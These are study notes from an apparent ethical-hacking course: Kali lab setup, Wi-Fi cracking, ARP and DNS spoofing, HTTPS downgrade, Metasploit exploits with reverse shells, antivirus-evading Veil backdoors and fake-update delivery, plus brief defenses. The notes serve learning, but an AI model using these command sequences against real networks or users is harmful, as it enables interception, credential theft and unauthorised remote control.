
**

Ethical Hacking - Some basic attack notions

  

Install Virtual Machines and Terminal

  

- Download and install virtualbox
    
- Download and install extension pack
    

  

Kali Linux

Kali Linux is based on Debian, the difference being that Kali has packages and tools for penetration tests and other things hackers use.

  

- Download Kali Linux from the page of the course - https://zsecurity.org/download-custom-kali/
    
- Double click the file
    
- Click import to the visualbox
    
- Select the virtual machine you desire to install and on the settings icon of virtualbox
    
- Click on system, give at least 2GB of RAM
    
- Click on processor and give at least 2
    
- Click on network and choose to use NAT NETWORK (If you don't see a network name, go to the resources of the course to solve it)
    
- If you're using virtual box 6 and have a computer with high resolution, go to monitor and put the scale to 200%
    
- Finish modifications
    
- Initialize the VM you want selecting and on start
    
- Click on the virtual machine and enter 
    
- Use the user root and password is toor
    

  

Snapshots allow you to save the state of your VM. You can use it as a bookmark to go back or forward to different configurations. Example: If you “break” the VM, you can go back to a bookmark where everything was working.

  

- Go to Virtual Box screen on your computer
    
- Click on the listing icon on the VM that you want to snapshot
    
- Click on snapshot
    
- Click on the camera icon and give it a name and description
    
- As you go using you can add new snapshots using the camera icon
    
- If you want to select another snapshot, select the one you want and click on restore
    

  

Terminal Linux commands and Terminator

  

Basic commands

- pwd - show the working directory
    
- ls - files and thing on this directory
    
- cd (file name) and cd .. - navigate files
    
- man (command name) - manual of the commands
    

Link to more terminal commands:

[https://www.mediacollege.com/linux/command/linux-command.html](https://www.mediacollege.com/linux/command/linux-command.html)

  

Install Terminator

- Open terminal
    
- apt-get update
    
- apt-get install terminator
    
- Drag what you just installed (Terminator) and put somewhere with easy access
    

  

Terminator can do same commands that the commun terminal, but it also can slip the screen to do multiple commands at the same time, what can be very useful when you are monitoring something and want to execute new commands

  

Network hacking

  

Network basics

You have the clients(ex: computers), the access point(ex: wi-fi router) and the resource(ex: internet). The client makes a request(ex: Google.com) to the access point and the access point looks for that on the resources. The resources give a response that the access point sends to the client. The client has no direct access to the resources.

  

Install wireless adapter

Going to be used on wi-fi hacking, most computers already have, but you can't access from a virtual machine, even if you could, they are not very good to hacking. Need to be purchased.

  

- Open Virtual Box
    
- Select the VM that you want to use
    
- Click on settings
    
- Click on ports
    
- Click on USB(make sure is enabled)
    
- Select the option that is used by your device (notebook 2.0)
    
- Click on plus icon
    
- Click on the adapter name and click on Ok
    
- Start Kali
    
- Go to the top
    
- Click on devices
    
- Click on USB
    
- Check if adapter is checked
    

  

MAC(Media Access Control) address

Is a permanent, physical and unique address assigned by the manufacturer. Like the IP serves to identify a computer, the MAC address is used within networks to identify devices and transfer data between them. Se each piece of data, or package, that is transferred contains a source MAC address and a destination MAC.

  

Why change the MAC address?

- Increase anonymity

- Impersonate other devices

- Bypass filters(you can gain access to things that only people with certain MAC address could)

  

- Open terminator
    
- ifconfig //Open a list of all devices that can be used to connect us with a network
    
- ifconfig wlan0 dow //to unable the one you want to change
    
- ifconfig wlan0 hw ether 00:11:22:33:44:55 <Put the MAC address number you want>
    
- ifconfig wlan0 up
    

  

OBS: The MAC address number will change back once you restart the computer because we're only changing in memory and not physically. If doesn't, there is something wrong.

  

The data, packages, are sent using the MAC address and if you're near (in wi-fi near) you can catch the data passing in the air, even if they don't have our MAC address as destination.

You need to change the mode of operation of our wireless operation to monitor mode

  

- Open terminator
    
- iwconfig
    
- ifconfig wlan0 dow
    
- airmon-ng check kill //interrupts any process that could interfere
    
- iwconfig wlan0 mode monitor
    
- ifconfig wlan0 up
    

  

Packet sniffing

  

It is a technique to get the data of a wi-fi network if you're near even if you aren't connected, don't have the password and is not the MAC address that should receive that information.

  

To do this there is a tool called Airodump-ng

- Part of the aircrack suit

- Is a packet sniffer

- Used to capture all packets within range

- Also displays detailed information about networks around us like clients connected, etc

OBS: you need to have the monitor mode activated

  

Open terminator

- airodump-ng mon0 //the last parameter can variate, is the name of the wireless adapter in monitor mode
    
- You can make stop running with control-C (also can be used to interrupt other programs running)
    

  

Understanding the information

BSSID - Shows the MAC address of the target network

PWR - Shows the strength of the signal of the network (the higher, the stronger)

Beacons - Are frames sent by the network to broadcast its existence. Show some of the information

#Data - Number of data packets that are useful

#/s - Number of packets we've collected on the past 10 seconds

CH - The chanel that works

MB - Shows the velocity

ENC - Shows the encryption method used

CIPHER - Shows the cipher used

AUTH - Shows the authentication method used

ESSID - Shows the network name

  

Wi-fi bands 

The bands of a network define the frequency that can be used to broadcast the signal. The 5Ghz and 2.4Ghz are common on wi-fi. The devices that want to use that networt have to support that frequency.

The adapter has to support that frequency to sniff, so some networks may not appear because they have other frequencies. 

If the wireless adapter that is being used has capacity, the command showed before just sniffs for 2.4 Ghz networks. To sniff 5Ghz:

- Open terminator
    
- airodump-ng --band a mon0 //5Ghz
    
- airodump-ng --band abg mon0 // 2.4 and 5Ghz (Will be slower, so sometimes is better to just do it separately)
    

  

After you have chosen the network you want to attack

- airodump-ng --bssid <The MAC address of the target network> --channel <number of the channel>
    
- --write test mon0
    

  

If everything goes well you will see new information that is from all the devices/clients connected on that network. If you press control-C, it will stop, but now you should have the data that was captured on your working directory.

- Open terminator
    
- ls
    

You will see that multiple files were created. The file named test-01.cap should have all the information that was sent and received with that network. But all the data is encrypted

Deauthentication attack

To deal with the encryption, one thing you can do is disconnect a client from a network without knowing the password. You change your MAC address to the client one and asks the Access point to disconnect and so you change your MAC address number to the one from the access point and say to the client that it will be disconnected. This attack is useful with engenharia social, you can disconnect a client, so you call it and make then install a virus or backdoor

  

- Open terminator
    
- wireshark //So you can discover the operating system of the client you want to attack
    
- airodump-ng --bssid <MAC address> --channel <number of the channel> mon0
    
- aireplay-ng --deauth 100000000 -a <MAC address of the network/access point> -c (MAC address from the client i want to disconnect> mon0
    

  

Breaking different types of encryption

  

WEP(Wired equivalent privacy)

Old, easily broken and rarely used. Client encrypted with a key stream(random initialisation vector with 24 bits is used to generate the key streams. IV + Key (password) = Key stream) is used, sent through air, router decrypt with key.

To crack we need to capture a large number of packets/IVs (the IVs are on each packet), analyse the captured IVs and crack the key

  

With big traffic - Big quantity of packets

- Open Terminator
    
- airodump-ng --bssid <MAC address)> --channel 1 --write basic_web mon0
    
- Open another terminator window
    
- ls
    
- aircrack-ng  basic_wep-01.cap
    
- Copy Key that was found, but take off the points from that number
    
- Now you can connect to the network using that as a password. If you do it from Kali, restart it before
    

  

With low traffic - Force it to generate packets

- Open terminator
    
- airodump-ng--bssid <MAC address of the network> --channel 6 --write arpreplay mon0
    
- Open another terminator window
    
- aireplay-ng --fakeauth 0 -a <MAC address of the target network> -h <MAC address of my wireless adapter> mon0
    
- You can discover MAC address of the wireless adapter with ifconfig, but replace the - with :
    
- Open another terminator window
    
- aireplay-ng --arpreplay -b <MAC address of the target network> -h <MAC address of my wireless adapter> mon0
    
- aireplay-ng --fakeauth 0 -a <MAC address of the target network> -h <MAC address of my wireless adapter> mon0
    
- aircrack-ng arpreplay-01.cap
    

  

WPA/WPA2

The two are very similar, the difference is the cryptography to guarantee the integrity of the data.

WPA uses key ip and WPA2 uses CCMP. They both are hacked the same, are more secure than WEP and more challenging.

  

WPS is a way that the user can connect without using the password. If not well protected, it can become a weakness that permits an attacker to connect without having to break the criptografia. The WPS generates a pin with only 8 digits, easy to discover. To be exploited, WPS needs to be enabled and PBC (Push Button Authentication) is not being used

  

- Open terminator
    
- wash --interface mon0 -//This command let you see all the networks around you that have WPS/WPS2
    
- control-C
    
- reaver --bssid <MAC address of the target network> --channel 1 --interface mon0 -vvv --no-associate //If appear error, use older version
    
- Open another terminator window
    
- aireplay-ng --fakeauth 30 -a <MAC address of target network> -h <MAC address of my wireless adapter> mon0
    

  

If WPS is not enabled, or if it is, but the push button is enabled, you will have to really break the encryption. Different from WEP, now not all of the packets sent are useful to break the password, the only ones who have useful information are handshake packets that are 4 packets sent when a client connects to a network. A solution is to force a user to reconnect. 

  

- Open Terminator
    
- airodump-ng --bssid <MAC address of the target network> --channel 1 --write wpa-handshake mon0 //With this command, you just have to wait for a client to connect to the network
    
- Open another terminator window
    
- aireplay-ng --deauth 4 -a <MAC address of the target network> -c <MAC address of the a client> mon0 //With this command you can force the disconnection, so the client will reconnect
    

  

With this the handshake will be captured and appear on the terminator screen. An important thing to know is that the handshake does not contain data to discover the key and to check if a Key is valid or not, you have create a word list(big text file with possible passwords) and go testing each with the handshake. You can download ready wordlists on internet

  

On the handshake there is the MIC(message integrity code) that is used to verify if a password is correct or not. We're going to use multiple informations from the handshake and combine with the first word(first trial) of our wordlist to generate another MIC to compare with the MIC captured on the handshake. If the two are the same, so the password we tried is right.

  

- Put your wordlist file on the root directory
    
- Open terminator
    
- aircrack-ng wpa-handshake-01.cap<captured file that contains the handshake> -w test.txt<file with my wordlist>
    

  

This can take a while depending on your processor. You also can find sites online that you upload the handshake and they try to find the password for you with their huge wordlist and fast computers.

  

Prevent Network Attacks

  

1.Do not use WEP encryption, as we have seen that is very easy it is to crack it regardless of the complexity of the password and even if there is nobody connected to the network.

  

2. Use WPA2 with a complex password, make sure the password contains small letters, capital letters, symbols and numbers and;

  

3. Ensure that the WPS feature is disabled as it can be used to crack your complex WPA2 key by brute-forcing the easy WPS pin.To do this, you need to access the configuring settings of the router. To do that, you need to access the configuration page that normally is the IP.

  

- Open terminator
    
- ifconfig wlan0
    
- Get the number that appear on inet addr
    
- Go to the computer browser, and put the address changing the last number to 1(so you get the router)
    
- Put the the user admin e password that is default on the manual
    
- Go to wireless
    
- Go to security
    
- On WPS you can disable WPS 
    
- Research other security measures
    

  
  

Post-connection network attacks

  

Install Window VM target

Let's install a virtual machine with windows to be our target machine that is connected on the same network. 

- Download Microsoft distributed version of windows 10 virtual machine on their site 
    
- Select windows 10 stable and virtual box
    
- Uncompress
    
- Doubleclick it
    
- Click import
    
- Select the virtual machine and settings
    
- Click on system, give at least 2 MB
    
- Click on ok
    
- Click on start
    
- Configure to use the same NAT network that the Kali machine
    

  

If you're asked for a password, it is: Passw0rd!

  

Information gathering

  

Information is very important to know how to attack a target, there are programs that can discover vital information for you.

  

Netdiscover

With it you can discover the devices connected on a network and other informations

- Open terminator
    
- netdiscover -r 10.02.1/24 //ip range to search for. That needs to be a range that can be accessed by you. So you can take your ip with ifconfig changing the last number to 00 and 24 - the range of possible ips
    

  

Nmap/Zenmap

Nmap is slower than netdiscover, but it will show you much more informations, like the open ports, running programs, operating system, etc. Is more complex and there are entire courses and books of just nmap

- Open terminator
    
- Open zenmap // is a visual application
    
- Go to the target field where you can put any ip that you can reach(that can be a personal computer, server or web page) or you can put a range like 10.02.1/24
    
- On profile select ping scan
    
- Click on scan
    

You can change the profile and get different informations: quick scan can find open ports; quick scan plus: you get even more information, like the operating system and programs running on the discovered ports and their version (knowing this you can Google it the program, version and how to exploit)

  

Man in the middle attacks

Attacks where we can intercept the communication between two devices. Arp spoofing allows us to redirect packets, that means that the data the target types will pass by the hacker computer before going to the access point. This can give you important information.

ARP (address resolution protocol) is a simple protocol used to relate an ip address of a machine to its MAC address. Every network has an ARP table that links the ips to the MAC addresses. To see it

- Open terminator
    
- arp -a
    

  

On the ARP spoofing, we send two ARP responses, one to the router saying we are the client machine(so the access point will update their ARP table associating the ip of the client with my MAC ADDRESS) and one to the client saying that we are the router.

Why is this possible? Because ARP is not secure, clients accept responses even if they didn't send a request of ARP verification and accept response without any form of verification.

  

arpspoof is a tool to run arp spoofing attacks, can be used on most operating systems including Ios e Android. You can use this tool to only redirect the flow of data to your computer and then you will have to use a packet sniffer like wireshark to analyse the data.

- Open terminator
    
- arpspoof -i eth0<specify the interface> -t <ip of target> <ip of gateway>
    
- Open another terminator window
    
- arpspoof -i eth0<specify the interface> -t <ip of gateway> <ip of the target> //One command is to fool the client and the other to fool the router
    
- Open another terminator window
    
- echo 1 > /proc/sys/net/ipv4/ip_foward // This command will allow the packets to flow and not stay stopped on our machine
    

  

Bettercap can be used to do the same that arpspoof and much more like capture data, sniff data, bypass HTTPS, redirect domain requests (DNS spoofing), inject code on loaded pages and more.

- Open Terminator
    
- bettercap -iface eth0 //with this command you specify the interface that you want to run the attacks against
    

  

This will enter on the tool, you can see that the prompt changed a little. You can use the command help to see to what each module can be used for.

  

net.probe on will start to look for clients connected to the same network

net.show shows a table with that information nicely

  

This is how you turn on a module of bettercap

- set arp.spoof.fullduplex true
    

  
  

ARP spoofing attack with bettercap

- With the bettercap prompt open 
    
- help arp.spoof //so you can see what the modules do
    
- set arp.spoof.fullduplex true
    
- set arp.spoof.targets <IP address of the target device>
    
- arp.spoof on
    
- Make sure that net.probe and net.recon are also running
    

  

Now we need to analyse the data captured

- net.sniff on
    

OBS: This will not work with https

  

To make this process easier you can use a caplet that is a text file with all the commands

  

This process will only work with http because is sent as plain text. This weakness was solved with HTTPS that is used by most websites because encrypts http using TLS (transport layer security) or SSL(secure sockets layer), that is very difficult to break.

The solution is to downgrade HTTPS to HTTP, to do this you need to manually configure and use a tool called SSL strip.

  

- As an example of this technique you can use a caplet that is on the resources of lesson 41. Download, extract and put on the directory Computer/usr/share/bettercap/caplets 
    
- Deleting the other one with the same name that is buggy
    
- Follow all the steps of the man in middle attack, but put the following code before the net.sniff on
    
- set net.sniff.local true //to sniff data even if appear to be local because that will happen with the following process
    
- Open another terminator window
    
- bettercap -iface eth0 -caplet /root/spoof.cap
    
- hstshijack/hstshijack
    

OBS: To test on the target device, is good to delete all the history of browser

OBS2: This will work with HTTPS and HTTP

  

And HSTS?

Modern browsers come with a list of websites that they should only load over HTTPS, so to bypass HSTS we can always make the browser think that is loading a different website

Ex: twitter.com -> twiter.com

What we have done so far it will work with HSTS if the user does not type the link on the link bar. But, if the person go to a search engine like Google and look for Facebook per example, the code that is running on the background will change the link to make the browser think is other site and the attack will work

  

Continue the next steps from where HTTPS bypassing example stopped, the file that we downloaded from the resources has the code you can modify if you open it and add the redirection. 

  

DNS spoofing

DNS é um server que converte nomes de domínios (google.com) to the IP of the server that is hosting the website. When you make a request for a site, the DNS server returns the IP of where the site is stored, accesses the server and sends you the answer with the page.

With man in the middle, the request pass for you first, so you can give any IP you want, you can redirect them to a fake site, etc

  

Kali comes with its own web server that is going to be used.

  

- Open terminator
    
- service apache2 start
    
- ifconfig //get the ip
    
- bettercap -iface eth0 caplet /root/spoot.cap
    
- set dns.spoof.address <ip to redirect>
    
- set dns.spoof.all true
    
- set dns.spoof.domains <domain to target>
    
- dns.spoof on
    

OBS: Works with sites that use https, but not with hsts

  

A form of exploiting this is to modify pages as they load, so you use Javascript injection

- Have a file with the Javascript code, save on your root directory
    
- Use the hstshijack that is on the resources of the course
    
- Open the .cap with text editor and change the payloads, now adding ,*: /root/alert.js //Will add the script we made on all pages
    
- Open another terminator window
    
- bettercap -iface eth0 -caplet /root/spoof.cap
    
- hstshijack/hstshijack
    

  

Wireshark

Wireshark is a network protocol analyser. Is not designed for hacking, but to network adms to see what's happening on the network and if everything is working correctly. How it work?It allows you to select an interface, then logs all the traffic that flows through that interface. Also has a graphical interface to analyse that traffic, you can search for some specific information. Big tool, you need a whole course for it.

  

- Open the program
    
- You can open a file if you already captured packets with some other program as airodump-ng and stored on file. This is good because you can capture the packets on your phone and save on a file to analyse at home.
    
- Not a hacking tool, it will only capture the packets that run through your computer. So wireshark is a good tool when combined with a man in the middle attack because you will be getting all of the packets from the target.
    
- Open terminator
    
- bettercap -iface eth0 -caplet /root/spoof.cap //with this wireshark already Will be getting the packets
    
- Open wireshark
    
- Go to capture options -> select the interface you want to sniff -> click on start (on output you can select a place to save the file to be analysed later)
    

Now everything is captured on wireshark, images, cookies, messages, etc

  

- Open terminator 
    
- hstshijack/hstshijack //so you will see certain sites without encryption
    
- Generate traffic on the target machine to test
    
- Click on stop on on wireshark
    
- Green is TCP packets
    
- Blue is DNS packets
    
- Black is TCP packets that had issues/problems
    
- You can use the filter space to filter the information, like http you will see the packets of the browser
    
- The arrows show if It was a request or a response
    

  

If you click on one, you will have more information about the packet. The hypertext transfer protocol will show you what the user typed, accessed, etc. 

On images requests, you can click with right button, follow and http stream, this will follow the stream and show you the response

To capture passwords and usernames(with man in the middle) you look for some that have POST, because forms normally use POST

You can use ctrl f to get the find bar. Select packet details, narrow and wide, string. Now you can search for the name of the person and the filter.

  

Bettercap is good at getting the psw and user, but sometimes it fails filtering this information, wireshark gets everything.

On your spoof.cap you can add set net.sniff.output /root/cupturedfile.cap before turning the sniffer on. With this, what is captured will be saved on a file.

  

Another method to become the man in the middle consists of changing the access point for our hacking computer, use our machine to create a wi-fi network that has internet access. Like this all the requests will pass for your machine without the need to use arp spoof, just using wireshark.

You need your computer, internet access(Any interface that has internet access) and a wireless device(wireless adapter that supports AP mode) that is going to broadcast the wi-fi signal

* On resources there is a vídeo about wi-fi adapters to buy

Quick way of doing:

- Use Mana-toolkit, that does all the process automatically
    
- Main start scripts
    
- start-noupstream.sh //starts fake AP with no Internet connection
    
- start-nat-simple.sh  //starts fake AP with internet connection //use this one and after use bettercap or wireshark
    
- start-nat-full.sh //start fake AP with internet connection, starts sniffing and bypass HTTPS// fails a lot
    
- Open virtual box
    
- Select the kali machine and on settings, network. There you will see that is configured to NAT network, that is eth0 virtual interface that gives internet access to the virtual machine as long as the host machine has internet access
    
- The wireless adapter is the wlan0 and must be on manage mode and not connected to any network
    
- Before you start, you must change mana settings that is normally on an .exe file
    
- Open another terminator window   
    
- leafpad etc/mana-toolkit/hostapd-mana.conf
    
- After you open the file, modify interface=wlan0 //or the name of you wireless interface
    
- ssid=internet // this is the name that people that going to see when they look for internet networks
    
- Save the text
    
- Open another terminator window
    
- leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
    
- After you open the file, modify upstream=eth0 //put the interface that has internet access
    
- phy=wlan0 // the interface that is going to broadcast the signal
    
- Save the text
    
- Open another terminator window
    
- bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh //That will run the code
    
- If there is an error, just try running again the same command
    
- OBS: Don't test if it worked from your host machine(Real computer), because the kali machine is getting the internet from there. You can test on another virtual machine with another wireless adapter or from your phone or other computador.
    

  

Now you can run wireshark or man f in the middle attack, but keep in mind that you have to use the same interface that is broadcasting the signal, that in this case is wlan0 and eth0

If your going to use man in the middle, ideally you would not need to use //arp//spoof argument, but doesn’t for dome reason, so add and it will work

  

Network hacking - detecting and security

  

Detecting ARP attacks

- Open the target machine command prompt
    
- arp -a
    

It will show the arp table that associates ip addresses to MAC addresses. A way of seeing If you are being attacked is to see that table and analyse if the mac address of the router is changed. There is a tool called XArp, that does this automatically for you.

- Download XArp and run it. It will give a notification if something happens
    

  

Using wireshark to detect suspicious activity

- Open wireshark
    
- Go to edit - preferences - protocols - ARP/RARP
    
- Enable detect ARP request storms
    
- Click on ok
    
- Start capture
    
- When the hacker starts asking for every IP like we learned, it will appear on wireshark
    
- Click on analyse - export information
    

You will see that an ARP packet storm was detected, someone was trying to discover connected devices or ports. When the hacker starts the attack, you will see a warning on export information, that says that there is a duplicated ip address configured.

  

A way of protecting your device is changing the arp table contents to static, so they can't be changed. The down of this is that everytime a device connect to your network, you have to manually configure the new user, what is hard for big companies.

  

Detecting MITM attacks 

You can detect the arp spoofing like shown before, but you can’t do much. You can change the password of the network or disconnect. so if the hacker is doing an mitm attack creating a fake access point, that won't work.

The following solutions are for when you believe that you are being attacked or if you are somewhere with a public network.

1. Install a plugin called https everywhere: when a site uses https and we downgrade to http, the plugin will not let the browser do it and will again make https. Like this your data continues to be encrypted. This solution is good, but not perfect because it will not work with http sites and DNS spoofing
    
2. VPN: when you make a request on the web, It will first pass by a VPN server. It will create a tunnel that encrypt everything that you send over. The VPN receives the encrypted request and decrypts, makes the request and so sends the reply to your computer also encrypted. Like this, even if your data is intercepted, will be utter gibberish.
    

- Paid service
    
- Also helps you bypass censorship
    
- Take care of what VPN provider you choose because this is a form of MITM, so the provider will have access to your traffic. Avoid free VPN because it has a cost, so they must have some motive. Make sure they keep no logs
    

  
  

Gaining access to Computer

  

You can access a computer - any electronic device with a operating system(computador, celular, tv, site, server, router, etc) - using two attacks approach:

  

The server side: does't have the user interaction. Gain access by IP and which operating system is being used

Client side: requires user interaction, and there are multiple alternatives for that

  

So we can practice server side attacks, we need another virtual machine to act like the server. The virtual machine that is going to be used is called Metasploitable and contains multiple services that are used by servers and some web applications that act like normal applications.

  

- Search Metasploitable  on Google (To download you can use an fake email of company like cris@solutions.com)
    
- Open virtualbox, make a new Linux machine and give It a gigabyte of RAM. 
    
- Mark use an existing virtual hard disc file and select the uncompressed file .vmdk you downloaded
    
- Info of login: msfadmin mafadmin
    
- OBS:Don't connect to internet
    
- To exit sudo poweroff
    
- Connect to the same network as the hacking machine with NAT depending on the attack
    

  

Gaining access - Server side attacks

You can use this type attack with servers or normal computers(a little hard if you are not connected on the same network, need to ping address. if is connected, use netdiscover or Zenmap.)

- Open terminator
    
- ping <IP address of the target server, personal computer, etc> //As long as you can ping it, you can use attacks we are going to talk about it
    

  

Information gathering 

Is very important because it helps you know the operating system and installed programs or running services on the target and ports associated with the services. Having this information you can 

1. Try default passwords
    
2. Exploit services that may have mis-configuration that can give you remote access to the computer
    
3. Exploit some services that even have backdoors
    
4. Exploit code execution vulnerabilities
    

You can get the services by putting the IP on zen map and Google its vulnerabilities. Also try to google every Port and see If can be explored.

  

Metasploit is a framework with a large number of exploits. Basics commands:

- msfconsole //runs metasploit console
    
- help //shows help
    
- show [something] //something can be exploits, payloads, auxiliary or options
    
- use [something] //use an exploit, payload or auxiliary
    
- set [option] [value] //configure a option to have a value
    
- exploit //runs the current task
    
- Install metasploit if you don't have yet
    

  

Example of metasploit use

- Open terminator
    
- msfconsole
    
- use [here he put the name of exploit that he found searching Google. Ex explot/unix/ftp/vsfpd_234_backdoor. This is a backdoor that one of the ports of the computer had]
    
- show option //shows options of exploit at that Port
    
- set RHOST 10.20.14.204 //ip of target
    
- exploit //run again if nothing happens
    

If everything goes well, a mensaje will appear: command Shell session 1 opened. This means you got access to the computer and can use linux line commands.

  

Code execution vulnerabilities

Example with samba username map script

- Open terminator
    
- use/exploit/multi/samba/username_script
    
- show options //Every Time you show the options of exploit will have different exploits
    
- set RHOST 10.20.14.204 //In the previous example, was used a backdoor that was already installed on the target computer. You just had to connect to the backdoor and could run any Linux command on the target computer. This time there is program with an execution vulnerability, a flaw that will allow us to run a small piece of code
    
- show payloads //Payloads are small pieces of code that are going to be executed on the target computer once the vulnerability is exploited. Depending on the payload we choose to execute, it will do something useful to us. Bind payloads, open a port on the target computer and we connect to that port. Reverse payloads open a port on my machine and the target connects. Useful to pass firewalls
    
- set PAYLOAD cmd/unix/reverse_netcat
    
- show options
    
- set LHOST 10.20.14.203 //my ip(hacker)
    
- set LPORT 80 //The target will try to connect with port 80, that is responsible by web browsers and doesn't alert firewalls, because firewalls are going to think that the user is just browsing the internet. BUT if you are using a server in that port, it can cause conflicts
    
- exploit
    

  

Nexpose tool

It's a vulnerability management framework, it allows us to discover, assess and act on discovered vulnerabilities. It also tells us a lot of information about the discovered vulnerabilities. Metasploit only shows vulnerabilities that can exploit with Metasploit, nexpose can show vulnerabilities that were on database of vulnerabilities and so, is more large scale

  

- Download Nexpose from internet
    
- Open terminator
    
- service postgresql stop
    
- Navigate to Downloads file on the command line
    
- ls
    
- chmod +x <file name> //This command will make the file executable, it will get green
    
- ./<file name>
    
- Go through the installation window
    
- If appear an error saying that the kali version is not supported, you have to change a couple of files to make it look like is Kali 2
    
- On port to database, try 5435
    
- Uncheck start nexpose when the installation is finished
    

  

- Open terminator 
    
- service postgresql stop //Turn off the database installed with the Kali Linux because nexpose uses its own and this may cause a conflict
    
- Navigate to where you installed nexpose
    
- cd /opd/rapid7/nexpose/
    
- cd nsc
    
- ./nsc.sh
    
- When running for the first time, it may take a while
    
- When the process finishes, it Will give an URL to be used on our browser
    
- There you will have to use the user and password you made when installing nexpose
    
- It will ask an product Key, It was sent to the email you registered
    
- Go to home on nexpose
    
- Click on create -> site
    
- Put the name Metasploitable
    
- Go to assets, you can add a range or a specific IP(put the IP of the Metasploitable machine). Put the group name as test
    
- If what you are trying to test have authentication, you can put the on authentication page
    
- On template you can choose the scan type
    
- On schedule you can make a test run everyday, or every week etc
    
- The most important things are the target and the template
    
- When you finish, you click on save and scan that will save the configurations and start the scan
    
- When it is finished, on assets you can see the results. You are going to see that it will be discovered with a lot more vulnerabilities than with Metasploit. You can see the operating system, the programs installed and services
    
- On reports you can get a report from the results of the scan. There are multiple templates to the reports
    

  
  

Gaining access - Client side attacks

Most of the time it is better to try to gain access to your target by server side attacks, trying to find exploits on the operating system or the applications installed. But, if it doesn't work or if the target is not on the same network(hiding behind an IP), try client side attacks. 

These attacks require the user to do something(open a link, install an update, open a picture, etc). Once they do it, you will be able to run code and achieve your goal.

Because it requires interaction, information gathering is vital, you need to know the applications installed, but also the person, their friends, the websites they use, etc. Knowing this information will be useful to create a history to convince the target to do something to you.

  

Generate backdoor indetectable

Backdoor is an executable file that gives you full control on the machine that gets executed on.

Backdoors can be detectable by anti virus, but you can use Veil framework to create backdoors que não são detectáveis

  

Install Veil framework

- Open terminator
    
- apt -get update
    
- apt -get install veil
    

  

To run Veil framework

- Open terminator
    
- veil //first time you run, it will ask to install dependências. If there are errors, the solution it will be together with the message
    
- veil //With veil loaded, you will see some commands available. You want to always be up to date because you want to bypass the antiviruses
    
- Veil has two main tools Evasion and Ordnance. The first generates undetectable backdoors and the second generates the payloads used by Evasion, like a helper. The payload is the part of the code of the backdoor that does the stuff that we want, the evil things.
    
- use 1 //now you will have Evasion enabled
    
- list //Show all the payloads available. They have a pattern on the name, language/type of payload/method that is going to be used to establish the connection
    
- use 15 //use the payload 15. It will show the options
    
- set LHOST 10.20.14.213 //LHOST It Will configure on which ip address the connection will be received. In the case of reverse connection you want this ip be the Kali machine one, the attack machine
    
- set LPORT 8080 //it will appear that the user is using the browser
    
- options
    
- set PROCESSORS 1
    
- set SLEEP 6 //Those don't make much difference, they just make the backdoor look a bit different
    
- generate
    
- Give It a name, it can be something like rev_https_8080, this will help you remember informations
    
- Copy the path where the backdoor is armazened
    
- To test if the backdoor can be detectable, go to Google on NoDistribute, upload the file and see the results
    

This will bypass almost all antivirus. The way that the antiviruses work is that they have a large database with signatures that correspond to files that contain harmful code. They compare the signatures of your backdoor with the ones in the database, if matches it will flag it as malware or virus. So is good to modify your file as much as you can, so it becomes more unique so will not match anything on the antivirus database

If is detected by some antiviruses, you can play around with the values of SLEEP for example and see what works

  

The payload generated does reverse connection, so it will connect our computer to the target computer, not access a port. Like this it will bypass various firewalls and look less suspicious.

For this we need to open a port on our computer where the target can connect. Use same port used when generating payload

- Open terminator
    
- msfconsole //use metasploit because the meterpreter used to make the payload was made by metasploit
    
- Listen for connections
    
- use exploit/multi/handler
    
- show options
    
- set PAYLOAD windows/meterpreter/reverse_https //The most important thing to change is the payload
    
- Set LHOST to attacker computer
    
- Set the LPORT to the one you used when generating the payload. Like 8080
    
- exploit
    

  

Now we need to trick the target in opening the file. To test, we can use a simple delivery method, putting on the server and downloading on the target computer. Nothing smart about it. Kali comes with a web server, a website. Let's put the backdoor on that website

- Go to home/var/www/html
    
- In the directory, generate a file called evil code, so we can test what we make. Inside put the backdoor we made
    
- Open terminator 
    
- Start the Kali website
    
- service apache2 start
    
- Go to the target computer and put on the browser the IP of the Kali machine/evil files
    
- Download the backdoor
    
- On the Kali machine, you're going to see that the target connected with us(because is reverse connection)
    

  

Smart ways to deliver backdoor

  

Spoof update

When a program on the target computer checks for updates, it will say that there is and they download and execute our backdoor. The limitation of this method is that you have to be the Man in the middle, you will have to be intercepting the connection.

How It works: the target machine will send a certain domain like update server to the DNS server. The DNS server Will send back the IP of the server requested, so the target machine will send a request directly to the update server if there is an update, the update server will send the update. If we intercept this connection, we can give the hacker ip to the target computer and send it our backdoor using evilGrade

  

- Install EvilGrade
    
- Open terminator 
    
- Go to the location of EvilGrade //Using is very similar to Metasploit
    
- show modules //show programs that can have the updates hacked
    
- configure <module name>
    
- show options
    
- set agent <path to the location of the file you want to be installed on target. Our backdoor in this case>
    
- ser endsite www.speedbit.com //site that opens when update is finished
    
- start //start EvilGrade
    
- Open another terminator window
    
- Become the man in the middle
    
- Do a DNS spoofing to spoof requests to the real site with the updates. So, when it does, it will return the IP of the Kali machine that is running EvilGrade
    
- Open another terminator window
    
- Listen from incoming connections using Metasploit
    
- Maybe the backdoor made with reverse https Will not work with EvilGrade, so make another and don't forget to change the payload path on the metasploit listener
    
- Now you can go to the target computer and ask for updates on the program you used to hack. You can send a Email saying that there is a update or make a popup appear on the target page with JS injection or any other method.
    

  

Another method to deliver

In this, you are going to wait for your target to download an .exe and we are going to backdoor this executable as is downloaded. The target will get what they wanted, but at the same time there will be a backdoor running in the background.

You will need to be theMITM  in the middle. You will need to use a tool called bdfproxy. On the resource of the course installed, this tool came together.

- Go to Home/BDFProxy
    
- There you are going to have the executable and the configuration file where you should change the proxy mode to transparent and the IP of the HOST of the system you are targeting
    
- Open terminator
    
- Navigate to where the tool is installed
    
- cd /opt/BDFProxy
    
- Run the executable
    
- ./bdf_proxy.py
    
- Open another terminator window
    
- Become the man in the middle
    
- Open another terminator window
    
- iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 //This will link all that is seen by the spoofing attack to the BDFProxy program. To do this, use an firewall that is pretty common on Linux machines called IPtables where you can specify rules
    
- Now listen for incoming connections using a multi handler or using the resources file the backdoor factory generates
    
- msf console --resource /opt/BDFProxy/resource.rc
    
- Now if everything is working, just wait the target fall for it
    
- session -l //to see open sessions
    
- session -i 1 //access the session, now you're inside metasploit
    
- sysinfo //Verify If attack worked
    

  

How to protect yourself

- Make sure you're not suffering a MITM attack, use a safe network, use xarp, static ip tables, etc

- Only download from HTTPS pages

- You can use a tool like winmd5. It will verify if the file download signature is the same that the upload site provided

  

Gaining access - Social engineering

  

